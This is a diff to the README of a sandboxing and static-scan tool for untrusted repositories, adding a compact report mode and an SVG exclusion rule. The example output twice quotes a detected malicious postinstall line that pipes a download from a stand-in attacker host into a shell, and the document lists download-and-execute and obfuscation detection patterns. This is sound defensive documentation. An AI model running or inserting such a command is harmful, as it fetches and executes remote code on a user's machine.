@@ -75,20 +75,21 @@ variants, and verification.
 
 ## Usage
 
-    meguard run <repo-url-or-path> [--image IMAGE] [--cmd "INSTALL CMD"] [--runtime CLI] [--strict] [--no-scan] [--fail-on-scan]
-    meguard scan <repo-url-or-path>
+    meguard run <repo-url-or-path> [--image IMAGE] [--cmd "INSTALL CMD"] [--runtime CLI] [--strict] [--no-scan] [--fail-on-scan] [-v|--verbose]
+    meguard scan <repo-url-or-path> [-v|--verbose]
 
 `run` and `scan` both accept a git URL (cloned to a temp dir that is always
 cleaned up) or a local path (copied, never bind mounted).
 
 Before creating the sandbox, `run` also statically scans the repo on the host
 (manifest inspection, entropy/long-line detection, and pattern matching for
-obfuscation and exfiltration signals) and prints a STATIC SCAN section.
-Findings are advisory by default: the sandboxed run proceeds regardless of
-what scan found, because containment, not scan, is the safety net. Pass
-`--no-scan` to skip scanning entirely (the pre-scan behavior), or
-`--fail-on-scan` to make `run` exit non-zero after the run completes if scan
-reported any High or Critical finding. See
+obfuscation and exfiltration signals) and folds the findings into its report
+(the compact "Top findings" block by default, or the full STATIC SCAN section
+under `-v`/`--verbose`; see below). Findings are advisory by default: the
+sandboxed run proceeds regardless of what scan found, because containment,
+not scan, is the safety net. Pass `--no-scan` to skip scanning entirely (the
+pre-scan behavior), or `--fail-on-scan` to make `run` exit non-zero after the
+run completes if scan reported any High or Critical finding. See
 [Static scan](#static-scan-meguard-scan) below for what scan looks for and for
 `meguard scan`, which runs the same detection alone with no Docker dependency.
 
@@ -116,9 +117,38 @@ Examples:
     # Strictest containment: no network stack at all, no egress logs
     meguard run ./suspicious-repo --strict
 
-meguard prints a pre-run notice listing the detected ecosystem, the runtime
-enforcing the sandbox, and the active protections, streams the sandbox output
-under a labeled section, then prints a result with the install exit code.
+    # Full detail: protections rationale, every finding, and the raw install log
+    meguard run ./suspicious-repo -v
+
+By default `run` prints a COMPACT report: a one-line header, a per-stage
+status checklist (`sandbox`, `install`, `scan`, `egress`, `secrets`, using
+✓/!/✗ glyphs), a "Top findings" block listing every High/Critical scan
+finding individually (capped at 8, with everything else rolled into one
+"... N more" line), and a single free-text `RESULT: ...` sentence. The raw
+install log is captured but not printed unless the install exited non-zero.
+For example, against a repo with a malicious `postinstall` hook:
+
+    meguard run <repo>
+
+    ✓ sandbox    node:20-slim, network denied (--strict, no logs), ephemeral
+    ✓ install    npm install (exit 0)
+    ! scan       8 finding(s) (2 high, 6 medium) across 8 files
+    ✓ egress     denied (--network none, no logs)
+    ✓ secrets    0 exposed (by construction: no host mounts, scratch HOME)
+
+    Top findings:
+      HIGH     package.json                             package.json "postinstall" lifecycle script matches download piped directly into a shell interpreter: curl -sSL https://evil.example/i.sh | sh
+      HIGH     package.json:1                           matches download piped directly into a shell interpreter
+      ... 6 more (5 entropy, 1 regex, mostly src/components/ui/*). see `meguard run -v`
+
+    RESULT: clean install, 0 secrets exposed, no egress reached the network. Review the 2 high/critical finding(s) above before trusting this repo.
+
+Pass `-v`/`--verbose` to restore the full report: the `meguard: preparing
+locked-down sandbox` header with the active-protections rationale, every scan
+finding listed individually with its snippet, and the streamed sandbox output.
+Nothing about detection or containment differs between the two modes; this is
+presentation only. Exit codes, `--fail-on-scan`, and `--no-scan` behave
+identically either way.
 
 ### Ecosystem auto-detection
 
@@ -232,6 +262,25 @@ Examples:
     # after the sandboxed run has still completed
     meguard run ./suspicious-repo --fail-on-scan
 
+    # Full detail: every finding listed individually with its snippet
+    meguard scan ./suspicious-repo -v
+
+By default `scan` prints a compact report: a one-line header, a status line,
+and a "Top findings" block (the same shape `run` prints; see
+[Usage](#usage) above), for example:
+
+    meguard scan <repo> (no container; read-only)
+
+    ! scan       8 finding(s) (2 high, 6 medium) across 8 files
+
+    Top findings:
+      HIGH     package.json                             package.json "postinstall" lifecycle script matches download piped directly into a shell interpreter: curl -sSL https://evil.example/i.sh | sh
+      HIGH     package.json:1                           matches download piped directly into a shell interpreter
+      ... 6 more (5 entropy, 1 regex, mostly src/components/ui/*). see `meguard scan -v`
+
+Pass `-v`/`--verbose` to list every finding individually with its snippet
+under a `STATIC SCAN` section, the previous default behavior.
+
 What scan looks for, via analyzers behind a single `Analyzer` interface:
 
 - **manifest**: `package.json` lifecycle scripts (`preinstall`, `install`,
@@ -242,7 +291,14 @@ What scan looks for, via analyzers behind a single `Analyzer` interface:
 - **entropy**: per-line length plus Shannon entropy on lines over 300
   characters, catching an obfuscated payload appended after legitimate code on
   the same physical line, in any text file. Checked-in minified bundles
-  (`dist/`, `build/`, `*.min.js`, `*.bundle.js`) are excluded.
+  (`dist/`, `build/`, `*.min.js`, `*.bundle.js`) are excluded, and so is a
+  `.svg` file, but only when it carries no `<script>` tag (SVG `path`/
+  `viewBox` coordinate data is legitimately one long line and would otherwise
+  false-positive; an SVG with a `<script>` tag is executable rather than
+  static graphics, so it loses the exclusion and is scrutinized like any
+  other file). Either way the exclusion is entropy-only: SVG can execute
+  (inline `<script>`, `onload=`/`onclick=` handlers), so the regex analyzer
+  below still scans all `.svg` content at full severity regardless.
 - **regex**: cheap first-pass pattern matching for obfuscation (packer
   signatures, `Function`-constructor eval, global-stashed `require`, the
   `_0xNNNN` obfuscator-tool fingerprint), download-and-execute (curl/wget
